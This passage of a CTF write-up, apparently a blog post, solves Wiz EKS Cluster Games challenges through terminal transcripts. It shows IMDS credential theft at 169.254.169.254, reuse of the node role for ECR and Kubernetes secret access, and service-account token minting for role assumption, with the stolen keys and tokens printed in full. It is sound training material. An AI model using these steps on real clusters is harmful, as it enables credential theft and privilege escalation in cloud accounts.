+</span></span><span style="display:flex;"><span>    startTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>kind: List
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/
+</span></span><span style="display:flex;"><span>info
+</span></span><span style="display:flex;"><span>security-credentials/
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+</span></span><span style="display:flex;"><span>eks-challenge-cluster-nodegroup-NodeInstanceRole
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;AccessKeyId&#34;</span>:<span style="color:#e6db74">&#34;ASIA2AVYNEVM5456IF7S&#34;</span>,<span style="color:#e6db74">&#34;Expiration&#34;</span>:<span style="color:#e6db74">&#34;2023-12-07 12:18:12+00:00&#34;</span>,<span style="color:#e6db74">&#34;SecretAccessKey&#34;</span>:<span style="color:#e6db74">&#34;TTSu90nCqKnCaMo5qcBrxy3ADzQAtu866QpLBI0V&#34;</span>,<span style="color:#e6db74">&#34;SessionToken&#34;</span>:<span style="color:#e6db74">&#34;FwoGZXIvYXdzEE0aDNvGnqE8nHcI0coOUCK3Aa5+9x5wSZlNVoMR2BIllD5lXXM/t90ohw7PRFyVCdU2wCvWkWYpw+gusnuUX2CsEKpwz1uQuYe2I4m8KFiVrUrMpCzQMYD8it6B/2biLdp0Xtb1dU9aq5IlgutlXxAtuaBW9jL5DUhKVB6h8geYWlgWr7/DG5cfQEt1fft7VdxfA03s2wPcDZ2lCFf3xtYy0aZqNBtoZh33Ntme8Zd+ZurLYhGBAVSRK1ICVJyTp8k2VkxMlLqVQyj008arBjItpFGwy6U1JpUOveqU3CfkODV0Cf7v2BgFR8dwvm7Gv3HPMAO7wSEOkr0Oceh0&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>ASIA2AVYNEVM5456IF7S
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>TTSu90nCqKnCaMo5qcBrxy3ADzQAtu866QpLBI0V
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_SESSION_TOKEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FwoGZXIvYXdzEE0aDNvGnqE8nHcI0coOUCK3Aa5+9x5wSZlNVoMR2BIllD5lXXM/t90ohw7PRFyVCdU2wCvWkWYpw+gusnuUX2CsEKpwz1uQuYe2I4m8KFiVrUrMpCzQMYD8it6B/2biLdp0Xtb1dU9aq5IlgutlXxAtuaBW9jL5DUhKVB6h8geYWlgWr7/DG5cfQEt1fft7VdxfA03s2wPcDZ2lCFf3xtYy0aZqNBtoZh33Ntme8Zd+ZurLYhGBAVSRK1ICVJyTp8k2VkxMlLqVQyj008arBjItpFGwy6U1JpUOveqU3CfkODV0Cf7v2BgFR8dwvm7Gv3HPMAO7wSEOkr0Oceh0&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_DEFAULT_REGION<span style="color:#f92672">=</span>us-west-1
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws ecr get-login-password
+</span></span><span style="display:flex;"><span>eyJwYXlsb2FkIjoiU29wcHhBeFR5ajU0aUNmWk1iVlRYamlEZkVyS2tJZkhja2I1NklsVzUyTTZNa3B2Y2s2L3dVbSsyQ2VEaXlSNExDT0VmVEYvWG5hdDFWWEM4OUl0aW5JQjlycHJHRlNvcXRkYlpnRE9uMHBhSUNWMk9ybThMbWlzdkltZGZJTTY0SHVZRGxxOG5HaGhvb0ExYnpZVWhEUExXQjFITHNwcnZhWElwZW9UZGRGSG1vaWhpcmkzUFpTVGRZN3pFdjVmK3lzZzNaYmJONnIrUDlVK3VwV3FzWXNScG5hdXliQ2RhMDcxUGVZcUhlSDVQKzgxRlJ1REsyNEw2R2NEbjFzNS9vSW1YejJtemFocDNuMlFCOTNqZjlnM1doOGdDRjUwdnpITTB4VlhEUTE4dGxzTFAvNmRWUDZSYisrdTRHYmFPUE1YRkdnT0RLbnN4ZENZRXVUZDM4c0plYWlFcUt1OTRMbFVmQ0E3M3ljV0hidU5iUjY1ajVxakNXSGYyOGY5WWxsSHNBQ2dGU1BZOFB0TFh3VHdKTFRSdGVIRyt6dWM2Y1lLYlBEaW9DT2krTFV2djdvUDhPUG1GL0M0WFlyakpna0JPODR0WHhZK2MwVll5Wnl2TW5oNW5peFFaWkM5SXZTYWcrUnpIR1VJdSt5VU4wamd4YkJuQ1IrcHRrN1pqSEo1UU9OZGRFVHBUUGFSQUtSSS9aQ1Z5SE5KaEM4Tmp3ckorVG9ETVFDVy91WnRaMWF4M0JOWDN4VzA5eXZNK2dHc1pUazNBcFp5aVNoZEZEOXBEWUFXS2d3M3llTXhhOTdVOEFFdW9kN3dZN2lQMWtJRnJqNlUzRXFreXdmZ3NaRGd4R3d4THcrN2hmOUp2a25qMW5lWC82L3hUaFk0cnlMWXJDdm0vNnl2bW9hcTRkVkNXT1VacDZLays4YXNaNmt6VDB6Z2J4Qy9hMCtRQ0ZQRS9maE0vNy9tMzVxRzZ3c1VXZ1JtQXh2NTRuYm9YUWtJdGdHWEkwSEwwT0pOZVkxTEJYU1NHMmo5bjNmU0RyVXVrUUlnVDhXWXVjd0J5UWx6bEIyS2RsUUN0a0lycTQ5aCtXZlVQR2VGKzJtZERhcnJIRk8rZHU1ZTQ0SzlYT1l0ZWRiYW1MQ05VTDg2VkNpUjV6QjM2ZGFZajd3d2pBeThWZFNOaDA4bExVNTYweWxaM1hFRWpxYTNSd3VacGVqcWozRG9OZ01lWkIzUFpaT2NkaVYwdHltNFA4Znk1ejdzSlIxOHdHWHR4djNXcEhWS1pxNFloNmNwclowa2d3N0wvanNyRkI2OUlaTUVrczZnT1Niajh2Q3VpWlcvRXFsNnFqMXFzZjJscC9RT21lNXhUdi9saTd6WWt5bXJDa0hUYzdONitYRGE2RVpGalJxOCtiMkh0cHFFQkFaeTRNdm00dmx2YzA1cUhmWkJiL28yUlRBT3ZUdjZpYjdNZ2pBYlNldkxmVnJVRkRiYktXdGM0eTgrdHN5SkZsMnZPdHhSdFo0R1VYZmVsUkl1TDZHa0pseXZnNk95bWhlK2lOS2xBK3M0OW9KQ0NiS0hyb0FsWUUzTldZTWNhaDFpWW0xc3FNUjJIbVFjN1pQeElTWEcvTHhtcC8ya3h1MU50V1A1eENGck9BM3drUlRPMDZwdU5waE95czVVdUUvZmtXQ1QwUm9FU0tTMDJ5WGMrSzV2L2N5d1drTmFNWFh6TjNTSWducz0iLCJkYXRha2V5IjoiQVFFQkFIaWpFRlhHd0YxY2lwVk9hY0c4cVJtSm9WQlBheThMVVV2VThSQ1ZWMFhvSHdBQUFINHdmQVlKS29aSWh2Y05BUWNHb0c4d2JRSUJBREJvQmdrcWhraUc5dzBCQndFd0hnWUpZSVpJQVdVREJBRXVNQkVFREgvbngwVFM1dVRqNExlRWpRSUJFSUE3YVZINFNBU3BRMThGaVgrUVVzaUs5aUxVZEhJUWh6M1IwVnROaloyZ2twaWtTTVNjOTQ4TnkvbVF5SUFIam9mc1gzTE9OZG5MZS9HcEdWMD0iLCJ2ZXJzaW9uIjoiMiIsInR5cGUiOiJEQVRBX0tFWSIsImV4cGlyYXRpb24iOjE3MDE5OTExODd9
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws sts get-caller-identity
+</span></span><span style="display:flex;"><span>Account: <span style="color:#e6db74">&#39;688655246681&#39;</span>
+</span></span><span style="display:flex;"><span>Arn: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282
+</span></span><span style="display:flex;"><span>UserId: AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
+</span></span><span style="display:flex;"><span>2023/12/07 11:20:55 logged in via /home/user/.docker/config.json
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;architecture&#34;</span>:<span style="color:#e6db74">&#34;amd64&#34;</span>,<span style="color:#e6db74">&#34;config&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Env&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;Cmd&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/sleep&#34;</span>,<span style="color:#e6db74">&#34;3133337&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;ArgsEscaped&#34;</span>:true,<span style="color:#e6db74">&#34;OnBuild&#34;</span>:null<span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:07.782534085Z&#34;</span>,<span style="color:#e6db74">&#34;history&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-07-18T23:19:33.538571854Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &#34;</span><span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-07-18T23:19:33.655005962Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;/bin/sh -c #(nop)  CMD [\&#34;sh\&#34;]&#34;</span>,<span style="color:#e6db74">&#34;empty_layer&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:07.782534085Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&#34;</span>,<span style="color:#e6db74">&#34;comment&#34;</span>:<span style="color:#e6db74">&#34;buildkit.dockerfile.v0&#34;</span><span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:07.782534085Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;CMD [\&#34;/bin/sleep\&#34; \&#34;3133337\&#34;]&#34;</span>,<span style="color:#e6db74">&#34;comment&#34;</span>:<span style="color:#e6db74">&#34;buildkit.dockerfile.v0&#34;</span>,<span style="color:#e6db74">&#34;empty_layer&#34;</span>:true<span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;os&#34;</span>:<span style="color:#e6db74">&#34;linux&#34;</span>,<span style="color:#e6db74">&#34;rootfs&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;layers&#34;</span>,<span style="color:#e6db74">&#34;diff_ids&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&#34;</span>,<span style="color:#e6db74">&#34;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&#34;</span><span style="color:#f92672">]}}</span>root@wiz-eks-challenge:~# 
+</span></span></code></pre></div><h2 id="pod-break">Pod Break</h2>
+<blockquote>
+<p>You&rsquo;re inside a vulnerable pod on an EKS cluster. Your pod&rsquo;s service-account has no permissions. Can you navigate your way to access the EKS Node&rsquo;s privileged service-account?</p>
+<p>Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions</p>
+</blockquote>
+<p><strong>solver</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
+</span></span><span style="display:flex;"><span>apiVersion: client.authentication.k8s.io/v1beta1
+</span></span><span style="display:flex;"><span>kind: ExecCredential
+</span></span><span style="display:flex;"><span>spec: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>status:
+</span></span><span style="display:flex;"><span>  expirationTimestamp: <span style="color:#e6db74">&#39;2023-12-07T13:04:20Z&#39;</span>
+</span></span><span style="display:flex;"><span>  token: k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk02M1JIM1RISiUyRjIwMjMxMjA3JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMDdUMTI1MDIwWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRTRhRERmU1MxS3R3NGJ5OEtlWHZpSzNBV3plaEFTSnZWdURBUFAlMkZzRDNkUXMwSnkwRiUyRkVaUCUyRlZ1SGhPRnVpazBKTEhnR1JpWWwzYXVqTUVzWUkxVjhza3pENFEwdDFyJTJCRndJSDh0ZDAlMkYyamkwJTJGSktYc0RyeXB6WTJpNVJ2SWdxM2JVN2dqSWdJeiUyQno1bCUyQmtVeXVGazRGR2g5QXJoMG1HaXY4SHBQYzMzbTJjSlM2OFpKZ3AwJTJCZ0gzYzB6eng2b2ZNYnZLQ3M3dU1icjA5b1JxJTJGb1RRb2ZnYlhUZWZkbzElMkZDNnZKdXd1a1hmbmRvOG0yeDBGNGlNcE43NlVESyUyQmswVUFvQ3dWT1ZXTUNqcCUyRnNhckJqSXRhbUNTRTh0eXJaR1Jpb1RmOXFPSEJmNFdDWEhmS3pUViUyQjlTdUVDeE00U1F5dTJLUEJYMDJnOURRdndudiZYLUFtei1TaWduYXR1cmU9Yzg0ZWQzZDViZTg1YTZlMzY1M2E3ZTdiNDJlMmM0YzdkOWQ5NmVlOWZhM2IwMDE4ZGJiNjc4N2E1YTYwNzYxYg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret
+</span></span><span style="display:flex;"><span>Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: secrets is forbidden: User <span style="color:#e6db74">&#34;system:serviceaccount:challenge4:service-account-challenge4&#34;</span> cannot list resource <span style="color:#e6db74">&#34;secrets&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> in the namespace <span style="color:#e6db74">&#34;challenge4&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret --token<span style="color:#f92672">=</span>$AWS_STS_TOKEN
+</span></span><span style="display:flex;"><span>NAME        TYPE     DATA   AGE
+</span></span><span style="display:flex;"><span>node-flag   Opaque   <span style="color:#ae81ff">1</span>      36d
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret -o yaml --token<span style="color:#f92672">=</span>$AWS_STS_TOKEN
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>items:
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  data:
+</span></span><span style="display:flex;"><span>    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  kind: Secret
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-11-01T12:27:57Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: node-flag
+</span></span><span style="display:flex;"><span>    namespace: challenge4
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;883574&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 26461a29-ec72-40e1-adc7-99128ce664f7
+</span></span><span style="display:flex;"><span>  type: Opaque
+</span></span><span style="display:flex;"><span>kind: List
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><p><a href="https://blog.lightspin.io/exploiting-eks-authentication-vulnerability-in-aws-iam-authenticator">Exploiting Authentication in AWS IAM Authenticator for Kubernetes </a></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202312072053557.png" alt="newblog1"></p>
+<h2 id="container-secrets-infrastructure">Container Secrets Infrastructure</h2>
+<blockquote>
+<p>You&rsquo;ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <em>s3access-sa</em> service account, and get the flag?</p>
+</blockquote>
+<p><strong>Trust Policy</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Principal&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Federated&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Condition&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;StringEquals&#34;</span>: {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&#34;</span>: <span style="color:#e6db74">&#34;sts.amazonaws.com&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>solver</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get serviceaccount -o yaml
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>items:
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: ServiceAccount
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      description: This is a dummy service account with empty policy attached
+</span></span><span style="display:flex;"><span>      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-10-31T20:07:37Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: debug-sa
+</span></span><span style="display:flex;"><span>    namespace: challenge5
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;671929&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: ServiceAccount
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-10-31T20:07:11Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: default
+</span></span><span style="display:flex;"><span>    namespace: challenge5
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;671804&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 77bd3db6-3642-40d5-b8c1-14fa1b0cba8c
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: ServiceAccount
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-10-31T20:07:34Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: s3access-sa
+</span></span><span style="display:flex;"><span>    namespace: challenge5
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;671916&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
+</span></span><span style="display:flex;"><span>kind: List
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl auth can-i --list
+</span></span><span style="display:flex;"><span>warning: the list may be incomplete: webhook authorizer does not support user rule resolution
+</span></span><span style="display:flex;"><span>Resources                                       Non-Resource URLs   Resource Names     Verbs
+</span></span><span style="display:flex;"><span>serviceaccounts/token                           <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[</span>debug-sa<span style="color:#f92672">]</span>         <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>pods                                            <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get list<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>secrets                                         <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get list<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>serviceaccounts                                 <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get list<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api/*<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api<span style="color:#f92672">]</span>              <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis/*<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis<span style="color:#f92672">]</span>             <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi/*<span style="color:#f92672">]</span>        <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>                 <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>podsecuritypolicies.policy                      <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[</span>eks.privileged<span style="color:#f92672">]</span>   <span style="color:#f92672">[</span>use<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl create token debug-sa --audience<span style="color:#f92672">=</span>sts.amazonaws.com  
